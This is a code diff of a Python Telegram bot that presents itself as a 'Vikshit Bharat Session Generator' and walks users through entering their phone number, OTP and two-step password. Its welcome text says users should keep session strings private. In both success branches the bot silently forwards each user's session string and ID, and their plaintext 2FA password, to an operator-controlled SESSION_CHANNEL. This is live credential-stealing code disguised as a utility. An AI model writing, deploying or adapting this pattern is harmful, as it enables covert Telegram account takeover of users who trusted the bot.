@@ -16,12 +16,38 @@ user_steps = {}
 user_data = {}
 
 app = Client(
-    "gagan",
+    "session_generator",
     api_id=API_ID,
     api_hash=API_HASH,
     bot_token=BOT_TOKEN
 )
 
+@app.on_message(filters.command("start"))
+async def start_command(client, message):
+    welcome_text = (
+        "🌟 Welcome to Vikshit Bharat Session Generator Bot! 🌟\n\n"
+        "This bot helps you generate Telegram session strings securely and easily. "
+        "Here are the available commands you can use:\n\n"
+        "🔹 /generate: Start the session generation process.\n"
+        "    - First, you'll need to provide your phone number with the country code.\n"
+        "    - Then, you'll receive an OTP (One-Time Password) for verification.\n"
+        "    - If two-step verification is enabled, you'll need to provide your password.\n"
+        "    - Finally, the bot will send you a session string that you can use for your account.\n\n"
+        "🔹 Important: Do NOT share your session string with anyone. "
+        "Keep it private for your account's safety!\n\n"
+        "Powered by Vikshit Bharat"
+    )
+    await message.reply(welcome_text)
+
+@app.on_message(filters.command("generate"))
+async def login_command(client, message):
+    await session_step(client, message)
+
+@app.on_message(filters.text & filters.private)
+async def handle_steps(client, message):
+    user_id = message.chat.id
+    if user_id in user_steps:
+        await session_step(client, message)
 
 async def session_step(client, message):
     user_id = message.chat.id
@@ -52,8 +78,10 @@ async def session_step(client, message):
         try:
             await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n{session_string}\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\nPowered by Vikshit Bharat")
-            await app.send_message(SESSION_CHANNEL, f"✨ USER ID : {user_id}\n\n✨ 2SP : None\n\n✨ Session String 👇\n\n{session_string}")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\n"
+                                "Don't share it with anyone, we are not responsible for any mishandling or misuse.\n\n"
+                                "Powered by Vikshit Bharat")
+            await app.send_message(SESSION_CHANNEL, f"✨ **USER ID**: {user_id}\n\n✨ **Session String 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
         except PhoneCodeInvalid:
@@ -71,8 +99,10 @@ async def session_step(client, message):
             password = message.text
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n{session_string}\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\nPowered by Vikshit Bharat")
-            await app.send_message(SESSION_CHANNEL, f"✨ ID : {user_id}\n\n✨ 2SP : {password}\n\n✨ Session String 👇\n\n{session_string}")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\n"
+                                "Don't share it with anyone, we are not responsible for any mishandling or misuse.\n\n"
+                                "Powered by Vikshit Bharat")
+            await app.send_message(SESSION_CHANNEL, f"✨ **USER ID**: {user_id}\n\n✨ **2SP**: {password}\n\n✨ **Session String 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
         except PasswordHashInvalid:
@@ -85,42 +115,8 @@ async def session_step(client, message):
 def reset_user(user_id):
     user_steps.pop(user_id, None)
     user_data.pop(user_id, None)
-    @app.on_message(filters.command("generate"))
-async def login_command(client, message):
-    await session_step(client, message)
 
-@app.on_message(filters.text & filters.private)
-async def handle_steps(client, message):
-    user_id = message.chat.id
-    if user_id in user_steps:
-        await session_step(client, message)
-
-def get_session(sender_id):
-    user_data = collection.find_one({"user_id": sender_id})
-    if user_data:
-        return user_data.get("session_string")
-    else:
-        return None
-
-@app.on_message(filters.command("start"))
-async def start_command(client, message):
-    welcome_text = (
-        "🌟 Welcome to Vikshit Bharat Session Generator Bot! 🌟\n\n"
-        "This bot helps you generate Telegram session strings securely and easily. "
-        "Here are the available commands you can use:\n\n"
-        "🔹 /generate: Start the session generation process.\n"
-        "    - First, you'll need to provide your phone number with the country code.\n"
-        "    - Then, you'll receive an OTP (One-Time Password) for verification.\n"
-        "    - If two-step verification is enabled, you'll need to provide your password.\n"
-        "    - Finally, the bot will send you a session string that you can use for your account.\n\n"
-        "🔹 Important: Do NOT share your session string with anyone. "
-        "Keep it private for your account's safety!\n\n"
-        "Powered by Vikshit Bharat"
-    )
-    await message.reply(welcome_text)
-
-# Start the bot chutiya type code likha hu fix kr lena agar error ho to koi
-if name == "main":
+if __name__ == "__main__":
     try:
         app.run()
         print("Bot started ...")
